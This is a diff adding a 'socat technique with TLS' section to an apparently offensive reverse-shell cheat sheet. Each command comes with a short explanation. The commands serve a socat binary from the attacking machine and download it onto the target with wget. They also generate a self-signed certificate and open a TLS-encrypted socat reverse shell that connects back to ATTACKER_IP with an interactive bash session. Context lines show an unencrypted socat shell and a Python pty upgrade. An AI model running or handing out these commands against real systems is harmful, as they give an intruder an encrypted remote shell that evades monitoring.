@@ -18,6 +18,22 @@ socat TCP-L:<PORT> FILE:`tty`,raw,echo=0
 socat TCP:<ATTACKER_IP>:<ATTACKER_PORT> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
                           Connection back to the reverse shell listener on a Linux target
 
+################ SOCAT TECHNIQUE WITH TLS ################
+sudo python3 -m http.server 80   
+                          Using a webserver on the attacking machine inside the directory containing your socat binary 
+wget <LOCAL_IP>/socat -O /tmp/socat
+                          On the target machine, using the ncat shell to download the file
+openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
+                          Generate a certificate in order to use encrypted shells
+cat shell.key shell.crt > shell.pem
+                          Merge the two created files into a single .pem file
+socat OPENSSL-LISTEN:<PORT> FILE:`tty`,raw,echo=0,cert=shell.pem,verify=0 -
+                          Socat Fully stable Linux tty reverse shell with encrypted TLS communication
+                          This will only work when the target is Linux (with socat installed or uploaded precompiled binary)
+                          Please note that the certificate must be used on whichever device is listening
+socat OPENSSL:<ATTACKER_IP>:<ATTACKER_PORT> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+                          Connection back to the reverse shell listener on a Linux target
+
 ################ NEW TECHNIQUE ################
 python -c 'import pty;pty.spawn("/bin/bash")'
                           Spawn a better featured bash shell using Python (use specific version if required)
